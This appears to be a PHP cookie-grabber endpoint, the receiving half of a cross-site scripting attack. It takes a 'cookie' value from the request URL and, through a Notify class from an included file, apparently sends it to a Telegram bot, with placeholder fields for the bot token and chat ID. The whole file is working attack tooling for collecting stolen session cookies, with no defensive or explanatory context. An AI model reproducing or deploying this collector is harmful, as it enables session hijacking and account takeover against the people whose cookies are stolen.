<?php
require_once("notify.php");
$cookies = $_GET['cookie']; // Cookies Params
$Not = new Notify('Comment For Alert',$cookies);
$Not->Send('Bot Token','ID Your Telegram');
?>